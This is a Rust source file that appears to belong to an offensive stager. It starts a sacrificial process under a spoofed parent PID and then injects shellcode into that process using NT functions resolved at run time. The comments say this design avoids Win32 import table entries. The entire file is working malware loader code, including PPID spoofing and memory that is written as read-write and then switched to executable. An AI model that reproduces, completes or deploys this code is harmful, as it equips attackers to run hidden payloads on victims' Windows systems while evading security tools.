// injection.rs
// Spawns a sacrificial process with a spoofed parent PID, then injects
// shellcode using dynamically-resolved NT functions called through ntdll
// function pointers (no Win32 IAT entries, syscall executes in ntdll):
//
//   NtAllocateVirtualMemory  (RW)
//   NtWriteVirtualMemory
//   NtProtectVirtualMemory   (RX)
//   NtCreateThreadEx

use std::ffi::c_void;
use std::ptr::null_mut;

use windows::Win32::System::Threading::{
    PROCESS_INFORMATION, STARTUPINFOEXW, STARTUPINFOW,
    LPPROC_THREAD_ATTRIBUTE_LIST, EXTENDED_STARTUPINFO_PRESENT,
};

use crate::dynload;
use crate::syscall::{
    init_syscalls,
    nt_alloc_virtual_memory,
    nt_write_virtual_memory,
    nt_protect_virtual_memory,
    nt_create_thread_ex,
};
use crate::utils::to_wide_null;

const PARENT_PROCESS_ATTR: usize = 0x00020000;
const PROCESS_ALL_ACCESS:  u32   = 0x001FFFFF;
const PAGE_READWRITE:      u32   = 0x04;
const PAGE_EXECUTE_READ:   u32   = 0x20;
const MEM_COMMIT_RESERVE:  u32   = 0x3000;
const THREAD_ALL_ACCESS:   u32   = 0x001FFFFF;

pub fn inject(parent_pid: u32, shellcode: &[u8]) -> Result<(), String> {
    unsafe {
        // ── Resolve process management APIs ───────────────────────────────────
        let fn_open_process   = dynload::open_process()           .ok_or("OpenProcess")?;
        let fn_close_handle   = dynload::close_handle()           .ok_or("CloseHandle")?;
        let fn_init_attr      = dynload::init_proc_thread_attr()  .ok_or("InitializeProcThreadAttributeList")?;
        let fn_update_attr    = dynload::update_proc_thread_attr().ok_or("UpdateProcThreadAttribute")?;
        let fn_delete_attr    = dynload::delete_proc_thread_attr().ok_or("DeleteProcThreadAttributeList")?;
        let fn_create_process = dynload::create_process_w()       .ok_or("CreateProcessW")?;
        let fn_sleep          = dynload::sleep()                  .ok_or("Sleep")?;

        // ── Open spoofed parent ───────────────────────────────────────────────
        let parent_handle = fn_open_process(PROCESS_ALL_ACCESS, 0, parent_pid);
        if parent_handle.is_null() {
            return Err("OpenProcess failed".into());
        }

        // ── Build PROC_THREAD_ATTRIBUTE_LIST with spoofed parent ──────────────
        let mut attr_size: usize = 0;
        fn_init_attr(null_mut(), 1, 0, &mut attr_size);

        let mut attr_buf = vec![0u8; attr_size];
        let attr_list    = attr_buf.as_mut_ptr() as *mut c_void;

        if fn_init_attr(attr_list, 1, 0, &mut attr_size) == 0 {
            let _ = fn_close_handle(parent_handle);
            return Err("InitializeProcThreadAttributeList failed".into());
        }

        if fn_update_attr(
            attr_list, 0, PARENT_PROCESS_ATTR,
            &parent_handle as *const *mut c_void as *const c_void,
            std::mem::size_of::<*mut c_void>(),
            null_mut(), null_mut(),
        ) == 0 {
            fn_delete_attr(attr_list);
            let _ = fn_close_handle(parent_handle);
            return Err("UpdateProcThreadAttribute failed".into());
        }

        // ── Spawn sacrificial process with spoofed parent ─────────────────────
        let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
        si_ex.StartupInfo.cb  = std::mem::size_of::<STARTUPINFOEXW>() as u32;
        si_ex.lpAttributeList = LPPROC_THREAD_ATTRIBUTE_LIST(attr_list as *mut _);

        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let target_str = crate::config::STAGER_CONFIG.inject_target().to_owned();
        let mut target_path = to_wide_null(&target_str);

        if fn_create_process(
            null_mut(), target_path.as_mut_ptr(),
            null_mut(), null_mut(), 0,
            EXTENDED_STARTUPINFO_PRESENT.0,
            null_mut(), null_mut(),
            &si_ex as *const STARTUPINFOEXW as *const STARTUPINFOW,
            &mut pi,
        ) == 0 {
            fn_delete_attr(attr_list);
            let _ = fn_close_handle(parent_handle);
            return Err("CreateProcessW failed".into());
        }

        // Allow the target process to finish loading its DLL chain before injecting.
        fn_sleep(500);

        let proc = pi.hProcess.0 as *mut c_void;

        // ── Inject via NT functions ────────────────────────────────────────────
        let result = do_inject(proc, shellcode);

        // ── Clean up ──────────────────────────────────────────────────────────
        fn_delete_attr(attr_list);
        let _ = fn_close_handle(parent_handle);
        let _ = fn_close_handle(proc);
        let _ = fn_close_handle(pi.hThread.0 as *mut c_void);

        result
    }
}

unsafe fn do_inject(proc: *mut c_void, shellcode: &[u8]) -> Result<(), String> {
    let fn_close = dynload::close_handle().ok_or("CloseHandle")?;

    if !init_syscalls() {
        return Err("init_syscalls failed".into());
    }

    // NtAllocateVirtualMemory RW
    let mut base: *mut c_void = null_mut();
    let mut region_size = shellcode.len();
    let s = nt_alloc_virtual_memory(
        proc, &mut base, 0, &mut region_size,
        MEM_COMMIT_RESERVE, PAGE_READWRITE,
    );
    if s < 0 || base.is_null() {
        return Err(format!("NtAllocateVirtualMemory: {:#x}", s as u32));
    }

    // NtWriteVirtualMemory
    let s = nt_write_virtual_memory(
        proc, base,
        shellcode.as_ptr() as *const c_void, shellcode.len(), null_mut(),
    );
    if s < 0 { return Err(format!("NtWriteVirtualMemory: {:#x}", s as u32)); }

    // NtProtectVirtualMemory RW → RX
    let mut protect_base = base;
    let mut protect_size = shellcode.len();
    let mut old: u32 = 0;
    let s = nt_protect_virtual_memory(
        proc, &mut protect_base, &mut protect_size, PAGE_EXECUTE_READ, &mut old,
    );
    if s < 0 { return Err(format!("NtProtectVirtualMemory: {:#x}", s as u32)); }

    // NtCreateThreadEx
    let mut h_thread: *mut c_void = null_mut();
    let s = nt_create_thread_ex(
        &mut h_thread, THREAD_ALL_ACCESS, null_mut(),
        proc, base as *const c_void, null_mut(),
        0, 0, 0, 0, null_mut(),
    );
    if s < 0 || h_thread.is_null() {
        return Err(format!("NtCreateThreadEx: {:#x}", s as u32));
    }
    let _ = fn_close(h_thread);

    Ok(())
}
